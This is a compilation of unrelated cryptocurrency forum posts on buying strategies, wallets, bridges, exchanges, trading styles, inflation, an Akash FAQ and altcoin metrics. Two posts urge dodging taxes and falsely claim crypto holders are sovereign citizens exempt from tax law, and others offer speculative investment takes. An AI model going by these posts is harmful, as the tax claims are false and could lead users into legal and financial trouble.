I currently live in Turkey, and despite the  Inflation, people are into Crypto and the concept of magical internet money, though this could also be because their money looses %10 every month against the USD. Still, I like to think it as if they're all Crypto enthusiasts!

Though, Erdo*gainz* (quite shockingly) doesn't like the freedom which people may avoid %300 taxing by holding their life savings not on a, say, a shitcoin that lost %22 against USD in a year, I.E: Turkish Lira.

&amp;#x200B;

I'm really interested in how some European/Asian countries, (and their governments) think about Crypto! So write them up, and ill going to try to read as much of them as I can!

Do you buy on a specific day or do you just buy whenever you have fiat regardless of the coins price?

As for me I always try to DCA in on alts whenever I see the coin and its -5% to -10% from its 24 hr % value. No matter how good that green percentage is to look at, I never DCA in on alts thats + in %.

For BTC and ETH tho I just put in a specific amount of money every week regardless of its price action because those two for me are for long term hodl.

So what are your buy signals when you buy a coin or when you DCA in?

I found it interesting that new currencies are offered everyday. How does someone learn more information about that currency? How it is different? Why it's better? etc? Why it should be relevant?

There're are a handful of popular currencies that seem to run the market BTC and ETH, for example. Does anyone think different coins will rotate in the top portion of the market? Kind of like how different stocks have rotated in and out of the top of the S&amp;P500?

On another note. How do people trade these newer/less popular currencies? Binance seems to offer many currencies. New, old, high mc, and low market cap. What is an alternative like this offered in the US?

We have the best money (bitcoin, but the example works with most cryptos...xmr, ltc even doge if you want) and store of value ever created. And it was all done voluntarily without coercion, taking from others or harming others. Individuals working together did this, not a government.   BTC (or whatever coin you prefer) was created voluntarily, the network is run voluntarily, adoption is done voluntarily and innovation is done voluntarily. Now large companies everywhere are adopting and adding onto it voluntarily. And if you step back and think about it, it's amazing. And it's just the beginning. Look at is what's possible with DAOs for instance.  I say this because I've seen some posts recently of people trying to tell others what they can't say or think on here.  They are wrong.

Hello to all, I would like to invest in one of the Metaverse projects, but I'm really struggling to choose in which one. I know that it would be ideal to invest in all of them and see what happens, but my budget is limited (as I'm sure is for many of you). So, basically, I have read a lot about all three projects and I like them all, but do you guys have any advice or insight which of them has the most potential for growth and further development? To put it simple, which one could bring the most profit? Thank you. :)

 **Today again exceeded 10 thousand documents (NFT transactions)** [**https://polygonscan.com/tokens-nft**](https://polygonscan.com/tokens-nft) **. All real business (B2B) in the shipping industry.**

**The buyback is 60 cents per document. Sounds good? =&gt; Buy on Kucoin.**

**The dice are rolled. At this point, all we have to do is wait and give the** CargoX **team time to complete the relayers and realize the first buybacks for Q4 (previously they were burning from the team wallet).**

**Now it is bought directly from the exchange.**

**So what's in the pipeline for $1+ this year?** [**https://coinmarketcap.com/currencies/cargox/**](https://coinmarketcap.com/currencies/cargox/)

FAQ:

Q: What is the utility for CXO tokens? A: Buybacks - is implemented through FIAT, which is paid by customers (B2B). Relayers and others are in the pipeline.

Q: How much will the buyback be per document?

A: The price is always $0.6/document.

Q: Are there types of documents, transactions that don't count for buybacks?

A: No. It has been confirmed that there will be buybacks for all document types.

Q: Will buybacks continue after the next utilization is implemented?

A: Yes.

Q: Is there a tracker for tracking online documents?

I tried to swap a token earlier today. The transaction approved and hours later, there is no difference shown in my wallet. No funds are gone (except the gas fee) and no evidence of a swap in the tokens of interest. All the app says when I click on the transaction is "APPROVE: token name". Any advice? Also, tried to contact trust wallet support, but apparently the captcha is not working, so my request never submitted after 3 tries..surprise, surprise. 

Posted this in r/trustapp and got a dm from a scammer posing as trustwallet support trying to get me to import my wallet info on this site: [https://mainnet-validator.org/home.html](https://mainnet-validator.org/home.html). Be careful out there!

I use Spooky Swap to move/bridge assets from the Binance Smart Chain to the Fantom Network. It freaks me out every damn time! The BNB disappears from the BSC network and your left there hanging without any in process indicator. 5-20 minutes go by and I'm like damn, wtf is going on!!! Clicking back and forth on Metamask Wallet from chain to chain, yep gone here, crap not here. Refresh, refresh, refresh.... And sigh..... It finally shows up in Fantom Network side. Has not failed yet but it freaks me out every damn time FOSHO!!!!

So what transactions do you do that scare the crap out of you?

BTW on a related but different subject. If you use pancake swap, break out the calculator and check that you are receiving proper value back on trades. I have canceled a few at the last check before approval lately because I would have gotten screwed on the exchange rate.

I don't really trust Google to show me the most interesting stories in crypto each day.

It's usually not the most substantive stories. Just the ones clicked on the most, usually 'ermegerd, crypto going up,' or 'ermagerd, crypto going down.'

Simply put, I started cruising through 600 articles PER DAY to find what's REALLY cool. I choose just a dozen or two from those hundreds.

For example, there's a new prototype sustainable miner that looks like a giant tree and collects sunlight just like a real tree, BUT then converts it to Bitcoin. Pretty cool, huh? These are the types of articles I curate in my daily batches.

I am a crypto and blockchain industry professional of 4 years and started a small subreddit called SimplyCryptoNews. It is simple, just 1 post daily of the most interesting links for crypto news. My spent time can be your gain. I am only 3 subscribers away from 100! Stop by for some nice reads and a good time.

The other day I saw a post on here of someone requesting a loan payment, saying they had a good credit history. It immediately seemed shady, and for that it was probably modded out, but I clicked on their profile before that. 

I saw they had posted it several other places, with more detail of transaction procedures, and names of third party apps for what I assume to be legit loan providers, and for a second I glimpsed into the world of the unbanked. I saw the true necessity for frictionless peer-to-peer translations. I honestly do not believe this person was a scammer of any kind and simply wished to make another similarly completed transaction.

Maybe the global south needs this more as a safe and simple way to transact more than westernized countries need it as a store of value.

Hi everybody.  I see general mood is pretty bullish, mine is too.

I was wondering, I have a particular portfolio that, i admit, lacks of the bigs (BTC/ETH) and this should say it all. However I am in a legit serious profit whit some alts, mainly one ( that is however 70% more or less of the total), i just finished liquidity and the big question is...

Do you guys agree with me, I'm feeling a bit insecure about how this bull run will affect alts. I think not every alt will benefit from the upcoming bull run (hypothetical) at the same pace. I was wondering if could be worth doing the craziest thing: swapping a part of my alts to buy BTC/ETH which i suppose will be heavily affected.

Now I'm struggling as it may seem and probably is me chasing profits but.. i mean , ATH is broken, the situation is what it is, what could be wrong? I'd keep a part of my alts and a part in liquidity. 

The only thing that haunts me and keeps me from doing it is ... as someone who's holding through the storm, i saw lot of occasions but never got out and even if I'm in profit, my portfolio saw better days, but I really trust what I'm invested in. I'm not getting emotional about those projects but I'm confident these are good stuff. 

So, basically :

A) I ride the waves, get out at the end ( seems easy wow) wait for the usual retracement and reset my portfolio then go on

B) Reset my portfolio, ride the waves, reset my portfolio then go on

P.S: in both cases, whatever I will do, I know I need a new strategy on how to keep my portfolio balanced and i'm working on it.

There are over 65 million in shorts s.l between 0.000053 and 0.000055 (god I hate to need to use so much 0's).
This is all pure speculation but if you had the money wouldn't you long SHIB, push the price up and liquidate all this shorts, take profits and make that money?

Just a theory but curious to see what some whales can do with that. It would need to be a 6-10% movement which would require over 100 million. But who knows. 

This should serve as a reminder to stay away from futures too. We know where your s.l (stop loss) is

Hi Everyone,

A few questions for anyone who secures their Metamask wallet with a Ledger.

Presumably the fact that the wallet was initially created as password-protected is not an issue when adding the hardware wallet security to it? DApps and such that are already using that particular Metamask wallet shouldn't suddenly start misbehaving because of the new security layer?

Since Metamask can use many chains, is it just a matter of launching the correct app on your Ledger when switching between networks (ie. polygon, eth, binance etc)? How's this all working for you - nice and smooth or problematic?

Thanks in advance for replies,

Luke

Yesterday i took a fat bong rip and concluded the following.

If i make gains, i pay taxes. Only makes sense. In my country, i do have free health care and education etc. Seems fair enough.

However, Last week, i made a huge loss and so.. Just theoretically, shouldnt the gov pay mee? I mean, it sounds weird, but the more i think About it, the more logical it sounds.

With that being said. I command you, my reddit army to rise and create a petition on change.org or something. I would say its at least worth a shot.

No? Okay

Not sure if this is commonly known but I just found out that old ripple wallets can be closed and the funds recovered.

I completelly missed that in 2020 the community voted in favor of possibility of closing the XRP wallet  to recover the locked funds. I my case I was able to recover 18 from my 20 XRP by closing the.unused wallet

How to do that:
1. import your XRP wallet into Trust wallet (ot any other supporting XRP
2. connect your Trust wallet with selected XRP wallet with XUMM website (or XUMM app)
3. in XUMM app select Accoynt Delete and fill the address to move your XRPs to ( in case of sending to exchange do.not forget to fill the Tag)
4. approve the transaction on your phone.

This should recover 18 from your 20 locked XRPs and send them to wallet of your selection. 

take care

This is the space for my libertarian rant about how the government should not tax me. 

I make money, shouldnt feel obligated to pay into the pot. I dont see enough posts about taxation is theft, or any general sentiment about how every cent we make is our own. I know Im different than everyone else but that you care about my opinion.

We are sovereign citizens. My internet money excuses me from the respective tax laws. Lets share with each other how to dodge tax laws.

Make money, keep it, move on. Lets be cute and not get caught. Money is worth it.

TLDR : We may check our portfolios a lot.  During a bull run we might check them a hell of a lot.   But the reason we do so is because we want to change our life.  At any point any one of our assets could explode and we're all just waiting for this to happen.  This is very different from a toxic addiction like a gambling addiction.   

\---------------

Yes we check our portfolios a lot.  This is because we're in the midst of a volatile period in crypto.  It's not like we're checking the weather.  Each individual 'check' on our crypto could mean so much to our lives.

How many of us hate our jobs?  We check our crypto so much because we so desperately want to break free.  So we keep checking our portfolio to see how close we are to this goal.

If you check your portfolio frequently especially at this time then you are just human.  Give yourself a break.  You are not a gambling addict or anything close.  This is normal considering the circumstances. 

Logically speaking, if we've picked the right crypto then each of us could pay important debts, feel less reliant on jobs which emotionally drain us.  Provide security for our children and so much more.

This is very different to a gambling addiction.

When you spend money on crypto you are actually purchasing something.  A quantity of a certain crypto currency.  But when you place a bet on a horse race, or a slot machine you are putting your money into the outcome or a single event.

A gambling addict will constantly spend money on very unlikely outcomes resulting in an unhealthy addiction to this ongoing process of loss.

A crypto addict in a bull run can buy seriously good crypto with great potential and check the shit out of it because it has actual potential to change their life.

Big difference!

Everyones talking about the Miami mayor and New York mayor receiving their paycheck in bitcoin, which is great for them. For me, Id totally want to receive my paycheck in crypto also. But the biggest issue is that without an account and routing number its a total pain to use the crypto to pay for things that require those (mortgage, utilities, etc). Youd have to transfer your direct deposit funds from Coinbase or Strike to a regular bank account, then pay as you normally would through the TradFi system. As far as I know you still can't pay a mortgage with a debit card either (Coinbase Card, I'm looking at you!) This is a huge barrier to adoption. So what do you think will happen first  crypto companies like Coinbase and Strike somehow getting us account and routing numbers that we can use, or mortgage and utilities companies allowing us to pay with means other than traditional bank accounts?

We obviously all think crypto is the future since were here, but what do we think are the biggest problems that keep people away from it? 
I feel once app/crypto makers make it easier to understand for the average person it will explode, even when Im sending money to myself to another wallet I get nervous waiting for the transaction or just over thinking it, thinking I put the wrong address etc, 
 once these little bumps are flattened out It will reach a much bigger customer base. What else do we think could keep the average person from investing in crypto ?

Everyone in crypto know about coinmarketcap. It's a website that shows info about cryptocurrencies like price, marketcap, volume... Last few months app was down so many times when I wanted to check something. I click on it and just like that the server is down. Besides all of that, one big scandal happend recently. Coinmarketcap got hacked and emails from all users were leaked. And because of this I started to get 10 phishing emails a day. How can I trust an app that big that can't keep theirs users info safe. From now on I will be switching to Coin Gecko. It never had any security problems and it's always online.

Hey there gang,

I know we all hold and do all we can to keep the momentum going, but I have some gains I've set aside as I want to get an Oculus Quest 2 to do some Sim Racing, and I am looking for the best way to make the purchase with my crypto.

This is not a request for input on my decision to buy from Facebook, or for my use of my crypto gains and not holding, I am just looking for the best way to directly purchase this product from my exchange.

Currently, I have USDT on Binance set aside to make the purchase, and I am not able to simply wire the money to my Bank as I am currently in the process of switching banks (Long story). 

Essentially, I am looking for a direct way, or easy and SAFE way to purchase a giftcard and be able to make an online purchase of the Quest and pick up this evening.

Can anyone point me in the right direction?

I've seen a few sites like Coinsbee, Gyft, etc...but am a little wary of proceeding.

Appreciate the help!

Some of us do one or more of these without knowing it and some of us are using these techniques for our advantage. Check them out to see if any of these fit you.

 

### Minimizing risk capital

Many successful day traders risk less than 1% to 2% of their account per trade.

### Trend following

Or momentum trading, is a strategy used in all trading time-frames, assumes that financial instruments which have been rising steadily will continue to rise, and vice versa with falling. Traders can profit by buying an instrument which has been rising, or short selling a falling one, in the expectation that the trend will continue. These traders use technical analysis to identify trends.

### Contrarian investing

Contrarian investing is a market timing strategy used in all trading time-frames. It assumes that financial instruments that have been rising steadily will reverse and start to fall, and vice versa. The contrarian trader buys an instrument which has been falling, or short-sells a rising one, in the expectation that the trend will change.

### Range trading

Range trading, or range-bound trading, is a trading style in which stocks are watched that have either been rising off a support price or falling off a resistance price. That is, every time the stock hits a high, it falls back to the low, and vice versa. Such a stock is said to be "trading in a range", which is the opposite of trending. The range trader therefore buys the stock at or near the low price, and sells (and possibly short sells) at the high. A related approach to range trading is looking for moves outside of an established range, called a breakout (price moves up) or a breakdown (price moves down), and assume that once the range has been broken prices will continue in that direction for some time.

### Scalping

Scalping was originally referred to as spread trading. Scalping is a trading style where small price gaps created by the bidask spread are exploited by the speculator. It normally involves establishing and liquidating a position quickly, usually within minutes or even seconds.

Scalping highly liquid instruments for off-the-floor day traders involves taking quick profits while minimizing risk (loss exposure). It applies technical analysis concepts such as over/under-bought, support and resistance zones as well as trendline, trading channel to enter the market at key points and take quick profits from small moves. The basic idea of scalping is to exploit the inefficiency of the market when volatility increases and the trading range expands. Scalpers also use the "fade" technique. When stock values suddenly rise, they short sell securities that seem overvalued.

### Rebate trading

Rebate trading is an equity trading style that uses ECN rebates as a primary source of profit and revenue. Most ECNs charge commissions to customers who want to have their orders filled immediately at the best prices available, but the ECNs pay commissions to buyers or sellers who "add liquidity" by placing limit orders that create "market-making" in a security. Rebate traders seek to make money from these rebates and will usually maximize their returns by trading low priced, high volume stocks. This enables them to trade more shares and contribute more liquidity with a set amount of capital, while limiting the risk that they will not be able to exit a position in the stock.

### Trading the news

The basic strategy of trading the news is to buy a stock which has just announced good news, or short sell on bad news. Such events provide enormous volatility in a stock and therefore the greatest chance for quick profits (or losses). Determining whether news is "good" or "bad" must be determined by the price action of the stock, because the market reaction may not match the tone of the news itself. This is because rumors or estimates of the event (like those issued by market and industry analysts) will already have been circulated before the official release, causing prices to move in anticipation. The price movement caused by the official news will therefore be determined by how good the news is relative to the market's expectations, not how good it is in absolute terms.

### Price action trading

Price action trading relies on technical analysis but does not rely on conventional indicators. These traders rely on a combination of price movement, chart patterns, volume, and other raw market data to gauge whether or not they should take a trade. This is seen as a "minimalist" approach to trading but is not by any means easier than any other trading methodology. It requires a solid background in understanding how markets work and the core principles within a market. However, the benefit for this methodology is that it is effective in virtually any market (stocks, foreign exchange, futures, gold, oil, etc.).

### Market-neutral trading

Market-neutral trading is a strategy that is designed to mitigate risk in which a trader takes a long position in one security and a short position in another security that is related.

### Algorithmic trading

It is estimated that more than 75% of stock trades in United States are generated by algorithmic trading or high-frequency trading. The increased use of algorithms and quantitative techniques has led to more competition and smaller profits. Algorithmic trading is used by banks and hedge funds as well as retail traders. Retail traders can buy commercially available automated trading systems or develop their own automatic trading software.

When people are investing in shit rug pulls and lose their life savings it is easy for us to say, "Well that's on them." and "DYOR" and "Bears make money, Bulls make money, Pigs get slaughtered." And yeah, you should be doing your own research and all, but in a few months when the bull market ends and BTC and ETH come crashing down 60%, you could easily end up with the same loses as someone that bought shitcoins like MARIO, SAFEMOON, and BABYDOGE this year.

At that time, mods are gonna have the suicide hotline pinned in the sub because people are gonna be down more than they can afford because they were FOMOing into the projects we basically worship here. Benjamin Cowen's TA could be completely wrong and the market could crash 99.99% tomorrow. None of us have crystal balls and I just want everyone to remember that we are in most volatile market right now and just because we are on top now doesn't mean we can't be in the hole tomorrow.

Take care of yourselves, everyone. It's gonna get even crazier from here.

What is Akash?
Akash means "open space" or "sky" in ancient Sanskrit.
Akash is an open source Cloud platform that lets you quickly deploy a Docker container to the Cloud provider of your choice for less than the cost of AWS, right from the command-line.
Define your Docker image, CPU, Memory, and Storage in a deploy.yaml file. 
Set your price, receive bids from providers in seconds, and select the lowest price. 
Deploy your application without having to set up, configure, or manage servers. Scale your application from a single container to hundreds of deployments.


What is the Akash Deployment Marketplace?
This where users lease computing resources from Cloud providers before deploying a Docker container on the Akash Container Platform. The marketplace stores on-chain records of requests, bids, leases, and settlement payments using the Akash Token (AKT). Akash's blockchain is a tendermint-based application based on the Cosmos SDK.

What is the Akash Container Platform?
It's a deployment platform for hosting and managing containers where users can run any Cloud-Native application. Akash is built with a set of cloud management services including kubernetes  to orchestrate and manage containers.


What is the cost to use Akash?
The cost of hosting your application using Akash is about one-third the cost of Amazon AWS, Google Cloud Platform (GCP), and Microsoft Azure. You can check the prices live using the https://akashlytics.com/price-compare


Why is Akash cheaper than Amazon?
Akash is seeding the market with top-tier data center providers and negotiating lower than market rates with data centers to lease their underutilized server resources. Most data centers have unused capacity sitting idle. Akash's software helps the data centers lease out their compute resources for Docker containers.

Why is Akash different than other Cloud platforms?
The decentralized cloud is a shift from computing resources being owned and operated by the three large Cloud companies (Amazon, Google, and Microsoft) to a decentralized network of Cloud providers running open source software developed by a community and creating competition in an open marketplace with more providers. Like Airbnb for server hosting, Akash is a marketplace that gives you control over the price you pay and the amenities included (we call them attributes). Akash gives app developers a command-line tool for leasing and deploying apps right from a terminal. Akash taps into the massive market of underutilized resources sitting idle in the estimated 8.4 million data centers globally. Any cloud-native and containerized applications running on the centralized cloud can run faster and at a lower cost on the Akash decentralized cloud.

Why is Akash different than other decentralized platforms?
Akash hosts containers where users can run any Cloud-Native application. There is no need to re-write the entire internet in a new proprietary language, and there is no vendor lock-in to prevent you from switching Cloud providers. The deployment file is transferred over a private peer-to-peer network isolated from the blockchain. Asset transfer occurs off-chain over mTLS to provide the security and performance required by mission-critical applications running on the Cloud.

Starting capital has always been my biggest challenge. I've been here since 2018, and usually something comes up from time to that that forces me to allocate more into my emergency fund, and less into crypto.

At this point, I'm going to need at least 1-2 more cycles to say that I made it, provided that crypto is still flourishing years from now. 

Another challenge is selling a coin too soon, and then it moons. Every time. Guaranteed. Basically I have antsy fingers, and they tend to want to do things that gives me less money ahaha

We've all seen the comments about people saying they don't care about market sentiment, that they just DCA and forget about it, but we also know that many cryptocurrencies have never reclaimed their spot while some previous top 50 coins have almost completely disappeared. 

What is it about your cryptos of choice that's making you so certain it will climb back up after the next BearMarket^tm ? Who says your coin won't be the next WaltonChain, EOS, DeepBrainChain, DENT or many others that are now only shadows of their former selves? Why take those chances and not take out some profits or at least swing them over to BTC, just in case? 

Just curious about your thoughts and why you think holding indefinitely is the best way to go for you.

(Mostly curious about top 100 coins that aren't BTC or ETH, since those two are the only ones we can all agree on will be here during the next cycle)

So does that stay too 20 in total or does it rise or decrease every hour or day. If so can I freeze that or what can I do with it. Can I turn it into cash like send that to my bank?

Ive read a lot of commentary that seems to be well supported in this sub that talks about these bull runs and the timing between the last one, the now, and the next one. While personally Im tempted to HODL no matter what happens, Im just as interested in bull runs as anyone else. While some folks may have a different idea of what is happening, Im generally talking about the following: 

Bull run in 2017
Bull run in April 2021
Bull run now

 A lot of folks seem to think if you miss the boat on selling this bull run, youll have to wait a few years to seize another opportunity. With only 6 months since the last bull run, why do people think these bull and bear runs will be so far apart? Are they not trending more frequently than they were from 2017-2020 in the current crypto environment? 

And as always explain like Im 5

Today I read that some banks give 0.1% per annum if you lock money with them for that period.

 **Wow, how cool is that, right? Amazing.**

That means my $ 1,000 in a year will become $ 1 right?  **NO.**  Your 1$ lost a value because of inflation.

Inflation performance and the CPI index can prove us this.  

What is CPI index?

*CPI index is the most well-known indicator of inflation is the Consumer Price Index, which measures the percentage change in the price of a basket of goods and services consumed by households.*  

&amp;#x200B;

**To everyone who are interested here is how the inflation is being calculated:**

&gt; **For example, if a loaf of bread cost $2.30 in 2011 and $2.65 in 2021, what would the rate of inflation be? Well, the CPI of the past date is $2.30 and the CPI of the current date is $2.65, so if we utilize the formula, we get:**  
&gt;  
&gt;**Inflation Rate =** ***$2.65 - $2.30  $2.65 x 100***  
&gt;  
&gt;**$2.65 - $2.30 = 0.35**  
&gt;  
&gt;**0.35  $2.65 = 0.13207547**  
&gt;  
&gt;**0.13207547 x 100 = 13.2%**

This means that the inflation rate of a loaf of bread between 2011 and 2021 was **13.2%.**

&amp;#x200B;

Not to mention that banks for that money of yours that you have locked with them **earn twice, three times more by lending it.**

And then think what are you getting? Go and tell this to your parents. Tell this to traditionalist. Ask them what do they think about it.

This way of working of banks is one of the **biggest reasons** why I want crypto to succeed in every corner, every house in the world.  

Let me get this straight, I'm not saying that you should put all your money in crypto, but many older people, retirees, transfer part of their money in a stable coin and get 5-10% or even more staking it for a year.

So I was trying to get into a bunch of minor alt coins. For example, light defi, alpha shin, etc. 

To buy these minor coins I see usually you have to use a swap service, most of them where pancake swap or some other one.

I had to get a wallet because they couldnt take Coinbase so I ended up getting trust wallet, metamask, and Binance chain.

So I now have all these wallets and I noticed I needed some BNB so I bought some on binance.us but apparently that Wallet is not binance chain Wallet. So I had to transfer it.

I was doing small $20 purchase of these minor coins but a lot of the transfer fees where $20 or more.

Am I doing something wrong here ? Also some wallets only had certain coins

I make my money, I pay into the pot. Taxation is theft and every cent **I** make should be **mine** only, not the government's. We all know this, but only billionares and the ultra wealthy are exempt.

We all should be sovereign citizens. Internet money is valuable, is **not** under control of any country and as such should not be subject from taxes and laws from any country.

Don't get cute and don't get caught. Authoritative taxing under threats of violence is not worth funding.

Don't be a lapdog.

Ive heard at least 3 people mention Squid Game token in the last few days. Everyone knows about how a bunch of people lost a lot of money to this complete scam. 

Ive seen the exact same thing with the fact that Bitcoin uses a lot of energy. Many people just dismiss this as all crypto wastes energy when in reality there are already much more efficient options like proof of stake.

I think this highlights a larger issue with the portrayal of crypto itself. The average person never hears about positive things in crypto. If a crypto project partners with some significant organization to fulfill a meaningful usecase, nobody hears about that.

This ends up creating a very one sided image of crypto where its only described negatively. I think that crypto is great and its unfair that the bad news is the stuff that gets clicks. The media still doesnt really get crypto at all.

I know you feeling bad about you last bag that you sold, or about the gains that you lost because you didn't invest. The most important thing is that you're here, with a safe and complete mindset. Don't let one crypto action ruin your day, mental health is crucial for you to reach your goals.


Mental health is the base for your everyday goals, if you keep on stressing yourself about stupid things you might just get things worst, so my advice is to always accept the reality as it comes without overthinking or over worrying about it. Just take a deep breath and start working on the solutions.

Im a resident of Mexico and currently use Bitso which has worked great so far. I have about 35% in ethereum% and 30%  in altcoins such as link and mana. However I'd like to diversify my investment.

I've read about some very promising coins like LRC. Unfortunately it isn't available on Bitso. I downloaded Abra but after reading some reviews i decided not to buy on there because o f all the people who have seemingly been scammed by Abra. I've also tried Coinbase but apparently its currently not available to Mexican residents. Does anyone have any good recommendations?

I am looking for an advice. I start trading usually after cool off period lets a week then i make $10K in 4 days then in next some days may be 4-5 days that money is gone and is liquidated.

&amp;#x200B;

This cycle happens almost everytime. I don't know what strategies to use for this case. If i cash out I can cash in for the hope that i will make it back and then everything comes back to 0.

&amp;#x200B;

Please suggest something, strategies anything which helps. Happy to share more information needed.

&amp;#x200B;

I do futures crypto.

This feels like a really noob question and probably only applies to US law either way. Does the IRS care what type of crypto involved in transactions come tax time?

I am of the understand are there a different 'types' of crypto, for lack of a better word. For instance--coins vs tokens vs NFTs. I even hold some crypto that touts itself as collectible coins (such as FanKoin dot com collectible sports team cryptocurrencies).

Does the IRS care what type of crypto it is come tax season, assuming one is buying/selling for profits?  Thanks!

In may I sold BTC, the whole bag @ 59, when we were coming down and decided to start DCAing again @ 31.
(Kept and HODLed through my Eth and Ada )

With those gains I wanted to buy some dark, for me, MicroCap and decided to go all in into CKB, I really like that project. Now I have to decide what to do when the bears come a callin

Would you hodl through the whole Bear Market and bite hard or try to time the top? 

Im trying to convince myself to DCA out of 80% of my CKB position, short it, in order to buy back in the next accumulation stage.

Have an decided an strategy? 
Are you sleeping it out? 

And now FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER FILLER.

Hey everyone, Im seeing a lot of talk on how this bull run isnt really in full gear yet or how we havent had a mania phase or blow off top yet. We very may well not experience these previous indicators like previous markets in 2013 and 2017 for the same reason many have said a bear market is so unlikely, **the market is much bigger now so previous patterns may not happen any longer**

Think about it, going from 3k BTC to 20k BTC needed substantially less money to go from 20k to where we are now. In my opinion, this same idea can be applied to multiple coins with big caps. Weve already seen multiple meme/shitcoins moon which can actually detract new money from getting into other blue chip cryptos as well. 

At the end of the day, the recent shit coin mania and how this place has turned into WSB, Im about 70-80% in stable coins and Im thinking we wont get the price targets or patterns that many are hoping for.

If you are a newbie and you see IOTX price being 3 times cheaper on Binance than on Coinbase, you will probably buy some on Binance and attempt to transfer them to Coinbase for an arbitrage opportunity. Well the issue is IOTX on Binance is on a newer chain, while Coinbase is trading the legacy coins on the Ethereum blockchain.

&amp;#x200B;

In the IOTX discord group, already dozens of people are saying they transferred their IOTX to Coinbase and the funds are lost. Only Coinbase will be able to recover tokens sent to the wrong network, and usually they only help after you beg and wait for up to 30 weeks.

&amp;#x200B;

For those people who did their DD and are utilizing the TubeSwap to bridge their Binance IOTX to Ethereum, the devs ran out of liquidity and each transaction is taking 5 minutes to process. The line is over 500 transaction long, so whoever was the last to transfer now has to wait over 4 days for their coins to come out the other side.

&amp;#x200B;

Now no one knows why Coinbase IOTX is trading so much higher than all other exchanges, but one thing is for sure, once the devs get their shit together, people and bots will flood the market to do arbitrage, pulling the price of IOTX on other exchanges up and pulling the price of IOTX on Coinbase down. There will be a middle ground, but where it is and why IOTX is pumping so hard only on Coinbase is unclear. I am buying up IOTX and will see where things are when the dust settles.

The famous saying it takes money to make money is absolutely true when it comes to crypto. For some of us who are living paycheck to paycheck, there simply isn't much money left at the end of the month to put in an investment. As such investing simply doesnt make its way up on your priority list because you think you are too poor to invest. Thats where you got it wrong.

For people like myself, who have little money, even the idea of investing into something as new as crypto can be scary or daunting. But dont let that stop you. You dont need to buy a whole Ether to start investing. You can easily start as I did, with investing 10$ at the end of the month. As a single dad I dont usually end up with more than a few tenners at the end of the month to use for myself and instead on spending this on chocolate bars (damn snickers is too good) or a few beers in the evening I decided to invest in ADA last year. That opened my eyes. I couldnt believe what world of possibilities I found. Until then I didnt even realise that buying small fractions of crypto was even possible! Crypto opened the doors for us less wealthy investors, and its on you to walk to them and enter the world full of possibilities!

If I was able to start Im pretty sure you will too. Start slowly, be vigilant, dont borrow money to invest in crypto and never leverage. If you follow that, you have a good chance at changing your future.

I have relatively small investment in cryptocurrency but I am slowly investing more. First as I believe it has a long term future and have FOMO. Second although I have no large amounts of Fiat to invest I have done relatively well with what  I have invested so far. This is partly due to luck with one meme coin but also due to research on more functional coins.

My largest holding is with Ethereum which I initially bought at the wrong time in 2017. Forgot about for a few years and then found it had recovered pretty well. After dabbling in a few other coins I have added a bit more ETH.

Staking is now available and I plan to hold what I have for the long term. My question is is it worth the risk of staking now or is there any real risk the upgrade will fail and I loose my stake?

&gt;**Without data youre just another person with an opinion. - W. Edwards Deming** 

I write about investing in altcoins for a living, and as I see more and more new investors come to the space, I see more and more misconceptions about how altcoins work, grow, and behave.

To help educate newer members of the community and refresh experienced ones on the fundamentals, today Im going to discuss five metrics that are absolutely necessary to understand if you want to make informed investments into altcoins.

What these metrics all have in common is the fact that theyre objective and indisputable; the reality can be interpreted in different ways, but these metrics are unarguable. Due to this certainty, they represent a foundation on which we can come to more reasoned and (hopefully) profitable conclusions.

Not only can these stats help us find hidden altcoin gems, they can also help us avoid red flags. The concepts are in no particular order.

# 1. Market Cap

**Where Its Found:** CoinGecko, CoinMarketCap, TradingView

**Definition:** Market Cap is a measure of the total size of a cryptocurrency. Its the price of a single token multiplied by the total amount of tokens in circulation. Diluted market cap reflects the price of a single token multiplied by the total amount of tokens that will ever be created.

&amp;#x200B;

https://preview.redd.it/43pz8m6bnnx71.png?width=1600&amp;format=png&amp;auto=webp&amp;s=a814c441c55dd41a8920be03533c8445c7f3223e

**Interpreting Market Cap:**

Market cap is meaningful because the size of a crypto helps us understand how much growth is possible or reasonable. For a given cryptocurrency to double in price, it requires an exponential increase in the input of capital. Check out the graph below:

&amp;#x200B;

https://preview.redd.it/13p41odcnnx71.png?width=1600&amp;format=png&amp;auto=webp&amp;s=6807cc707d3f659055401dae62389736e9cfb96c

For a real-life example, Bitcoin experienced a 1000x that took only 30 months (Sep 2010 - Mar 2013) when price went from $0.06 to $60. The next 1000x took 96 months. Another 1000x from today would value Bitcoin at 1.14 quadrillion dollars, over 12 times the size of the entire world economy. It probably just wont happen.

And for Bitcoin to double from todays price, it would require an injection of over $1 trillion of capital. Its possible, but no small feat. But a $1 million altcoin could absolutely experience a 1000x. It would require less than $1 billion of new capital, which wouldnt even put it in the top 100 cryptos by market cap. This is also the reason Shiba Inu won't go to a dollar.

**Why Its Important:** The previous graph shows us that the majority of an altcoins gains happen early in its life cycle. So although smaller cryptos are a lot riskier, they have a lot more upside because less capital can move the price.

# 2. Total Value Locked

**Where Its Found:** CoinGecko

**Definition:** The sum of all assets deposited (or locked) in a given protocol. Assets are locked up to provide collateral for loans, generate interest, or be staked for more coins.

**Interpreting Total Value Locked:**

Cryptocurrencies are valuable for all kinds of reasonsBitcoin is valuable because its a decentralized, transferrable store of value. Monero is valuable because its a private currency. Ethereum is valuable because it creates smart contracts, decentralized agreements to store and transfer value between network users across time.

Total Value Locked (TVL) is based on that third type of value, the idea that value can be stored within a crypto by being deposited, used as collateral, used as liquidity, or staked for interest. The dollar value locked within a protocol is one way to estimate the intrinisic, fundamental value of that asset.

So what does this TVL mean for the value given cryptocurrency? Some ecosystems generate enormous cash flows and fees on value locked, which are then distributed back to users (Maker Dao and Abracabra Money would be some examples). With protocols like AAVE, the fees generated are used to buy back the token and burn it, creating a deflationary supply. Uniswap doesnt even charge fees for the use of their protocol, but all of the assets locked up inside represent real value.

https://preview.redd.it/576r885snnx71.png?width=1600&amp;format=png&amp;auto=webp&amp;s=3d3f12ccafd3eb072a6b2f1da4a80278f22632e2

